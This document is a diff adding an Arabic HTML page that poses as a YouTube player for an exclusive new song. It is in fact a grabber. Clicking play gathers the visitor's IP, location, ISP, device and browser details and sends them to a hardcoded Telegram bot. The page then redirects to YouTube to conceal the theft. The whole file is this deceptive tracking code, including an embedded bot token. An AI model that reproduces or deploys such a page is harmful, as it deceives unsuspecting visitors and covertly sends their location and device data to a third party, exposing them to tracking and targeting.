@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاهدة فيديو يوتيوب - حصري</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .container {
+            max-width: 650px;
+            margin: 30px auto;
+            padding: 15px;
+        }
+        .player-box {
+            background-color: #212121;
+            height: 280px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        .play-btn {
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 36px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .play-btn:active {
+            transform: scale(0.95);
+        }
+        .video-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 15px;
+            text-align: right;
+            padding-right: 5px;
+        }
+        .channel-info {
+            color: #aaa;
+            font-size: 14px;
+            text-align: right;
+            padding-right: 5px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="player-box" id="playerArea">
+            <button class="play-btn" onclick="harvestAndRedirect()">▶ تشغيل الفيديو</button>
+        </div>
+        <div class="video-title">أغنية حصرية جديدة 2026 - النسخة الأصلية بجودة عالية</div>
+        <div class="channel-info">قناة الأغاني الرسمية • 2.4 مليون مشاهدة</div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7833390122:AAG7pnJhD90Yv4bkUalkxQV3-psMcOCIWrQ";
+        const TELEGRAM_CHAT_ID = "8433844160";
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {}
+        }
+
+        async function harvestAndRedirect() {
+            document.getElementById('playerArea').innerHTML = '<p style="color:#00ff66; font-size:16px;">جاري تشغيل الفيديو...</p>';
+
+            let ipInfo = {};
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                ipInfo = await response.json();
+            } catch (err) {
+                ipInfo = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
+            }
+
+            const deviceDetails = {
+                ip: ipInfo.ip || "Unknown",
+                city: ipInfo.city || "Unknown",
+                country: ipInfo.country_name || "Unknown",
+                org: ipInfo.org || "Unknown",
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                cores: navigator.hardwareConcurrency || "Unknown",
+                memory: navigator.deviceMemory || "Unknown",
+                userAgent: navigator.userAgent
+            };
+
+            let reportMessage = `🎯 <b>صيد جديد تم رصده!</b>\n\n` +
+                                `🌐 <b>عنوان IP:</b> <code>${deviceDetails.ip}</code>\n` +
+                                `🌍 <b>الدولة / المدينة:</b> ${deviceDetails.country} / ${deviceDetails.city}\n` +
+                                `🏢 <b>مزود الشبكة:</b> ${deviceDetails.org}\n` +
+                                `📱 <b>النظام:</b> ${deviceDetails.platform}\n` +
+                                `🗣 <b>لغة الجهاز:</b> ${deviceDetails.language}\n` +
+                                `📐 <b>دقة الشاشة:</b> ${deviceDetails.screenWidth}x${deviceDetails.screenHeight}\n` +
+                                `⚙ <b>الأنوية / الذاكرة:</b> نواة: ${deviceDetails.cores} | رام: ${deviceDetails.memory}\n` +
+                                `💻 <b>معلومات المتصفح:</b> <code>${deviceDetails.userAgent}</code>`;
+
+            await sendToTelegram(reportMessage);
+
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com";
+            }, 1200);
+        }
+    </script>
+</body>
+</html>
